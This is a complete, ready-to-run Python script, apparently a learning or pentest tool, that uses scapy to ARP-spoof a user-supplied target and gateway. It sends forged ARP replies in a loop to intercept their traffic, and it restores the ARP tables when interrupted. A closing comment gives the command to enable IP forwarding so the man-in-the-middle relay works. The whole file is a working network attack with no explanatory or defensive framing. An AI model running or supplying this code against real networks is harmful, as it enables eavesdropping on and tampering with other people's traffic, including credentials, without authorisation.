#!/usr/bin/env python3

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
    op=2,
    pdst=target_ip,
    hwdst=target_mac,
    psrc=spoof_ip
    )
    scapy.sendp(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(
    op=2,
    pdst=destination_ip,
    hwdst=destination_mac,
    psrc=source_ip,
    hwsrc=source_mac
    )
    scapy.sendp(packet, verbose=False)


target_ip = str(input("Enter Target IP >> "))
gateway_ip = str(input("Enter Gateway IP >> "))


try:
    send_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_count += 2
        print(f"\r[+] Packets sent: {send_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nRestoring ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("ARP tables restored. Exiting.")



# Command to enable IP forwarding on Linux:
# echo 1 > /proc/sys/net/ipv4/ip_forward